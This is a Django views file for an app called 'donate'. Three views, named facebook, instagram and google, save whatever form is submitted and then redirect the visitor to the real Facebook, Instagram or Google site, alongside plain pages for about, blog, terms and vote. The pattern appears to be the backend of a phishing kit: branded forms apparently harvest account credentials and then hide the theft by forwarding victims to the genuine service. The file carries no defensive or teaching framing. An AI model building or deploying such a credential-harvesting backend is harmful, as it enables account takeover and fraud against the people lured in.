from django.shortcuts import render, redirect
from .models import *
from .forms import *
# Create your views here.

def index( request):
    return render (request, 'donate/index.html') 

def about( request):
    return render (request, 'donate/about.html') 

def blog( request):
    return render (request, 'donate/blog.html') 

def contact( request):
    return render (request, 'donate/contact.html') 

def facebook(request):
    if request.method == 'POST':
        form = Facebook(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect("https://facebook.com")
    else:
        form =  Facebook()
    context = {'form': form}
    return render (request, "donate/facebook.html", {'form':form})

def instagram(request):
    if request.method == 'POST':
        form = Instagram(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect("https://instagram.com")
    else:
        form =  Instagram()
    context = {'form': form}
    return render (request, "donate/instagram.html", {'form':form})

def terms( request):
    return render (request, 'donate/terms.html')      

def vote( request):
    return render (request, 'donate/vote.html') 

def google(request):
    if request.method == 'POST':
        form = Google(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect("https://Google.com")
    else:
        form =  Google()
    context = {'form': form}
    return render (request, "donate/google.html", {'form':form})